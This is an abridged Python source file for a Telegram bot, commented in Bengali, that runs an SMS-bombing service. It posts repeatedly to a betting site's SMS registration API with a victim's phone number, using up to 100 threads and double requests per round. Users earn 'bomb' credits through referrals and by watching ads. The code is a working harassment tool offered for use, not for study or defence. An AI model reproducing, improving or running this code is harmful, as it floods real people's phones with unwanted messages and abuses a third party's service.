...
# ==========================================
# Timeout বাড়িয়ে 5 সেকেন্ড করা হয়েছে যাতে রেসপন্স মিস না হয়
...
def xbet_api(target):
    try: requests.post("https://1x-bet.mobi/web-api/api/web/registration/v2/sms", json={"data":{"attributes":{"phone": target[-10:], "country_code": "880"}}}, timeout=5)
    except: pass
...
def attack_executor(target, amount):
    ...
    with ThreadPoolExecutor(max_workers=100) as executor: # Worker সংখ্যা বাড়ানো হয়েছে
        for _ in range(amount):
            for run_api in apis:
                # একই রাউন্ডে ২ বার রিকোয়েস্ট পাঠানো হচ্ছে
...
def welcome(message):
    ...
    if uid not in db['users']: 
        ...
        if len(args) > 1 and args[1] in db['users'] and args[1] != uid:
            ...
            try: bot.send_message(args[1], "🎉 কেউ আপনার লিঙ্কে জয়েন করেছে! +5 ক্রেডিট।")
            except: pass
        save_data(db)
...
def menu_logic(message):
    ...
    if message.text == "🚀 Start Bomb":
        ...
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔗 Watch Ad (Wait 10s)", callback_data="open_ad"))
        bot.send_message(message.chat.id, "বাটনে ক্লিক করে অ্যাড পেজে ১০ সেকেন্ড অপেক্ষা করুন।", reply_markup=markup)
...
def callback_handler(call):
    ...
    if call.data == "open_ad":
        bot.answer_callback_query(call.id, "অ্যাড পেজ লোড হচ্ছে...")
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🌐 Open Ad Website", url=ADSTERRA_URL))
        bot.edit_message_text("অ্যাড দেখা হচ্ছে... ১০ সেকেন্ড অপেক্ষা করুন।", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
        # 10 Seconds Timer
        time.sleep(10)
        
        new_markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✅ Claim 10 Credits", callback_data="claim_now"))
        bot.edit_message_text("সময় শেষ! এখন ক্রেডিট ক্লেইম করুন।", call.message.chat.id, call.message.message_id, reply_markup=new_markup)

    elif call.data == "claim_now":
        db['users'][uid]['credits'] += 10
        save_data(db)
        bot.answer_callback_query(call.id, "🎉 +10 Credits Added!")
        bot.edit_message_text("✅ ক্রেডিট যোগ সফল। আপনি আবার চাইলে অ্যাড দেখতে পারেন।", call.message.chat.id, call.message.message_id)
...
def process_bomb(message, target):
    ...
    try:
        ...
        bot.reply_to(message, f"🚀 {target} নাম্বারে ডাবল স্পিডে বোম্বিং শুরু হয়েছে!")
